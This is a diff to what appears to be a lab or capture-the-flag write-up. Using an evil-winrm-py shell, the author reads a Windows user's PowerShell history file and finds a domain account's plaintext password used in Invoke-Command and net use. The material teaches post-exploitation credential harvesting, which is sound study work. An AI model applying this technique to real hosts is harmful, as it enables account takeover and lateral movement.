@@ -450,3 +450,25 @@ evil-winrm-py PS C:\Shares\Company>
 
 I can now view the pdf files in this share
 
+There is nothing interesting in the pdf files
+
+```python
+evil-winrm-py PS C:\Users\m.white\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_hi
+story.txt
+Get-Process
+Get-ChildItem C:\Shares
+cd C:\Shares\IT
+dir
+ipconfig /all
+Test-Connection DC01
+$cred = New-Object System.Management.Automation.PSCredential('ORION\m.reeves', (ConvertTo-SecureString 'Pa$$word!123' -AsPlainText -Force))
+Invoke-Command -ComputerName WS-IT -Credential $cred -ScriptBlock { whoami }
+net use Z: \\WS-IT\IT /user:ORION\m.reeves Pa$$word!123
+Get-EventLog -LogName System -Newest 10
+cls
+exit
+evil-winrm-py PS C:\Users\m.white\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine>
+```
+
+Found some credentials in the powershell history
+
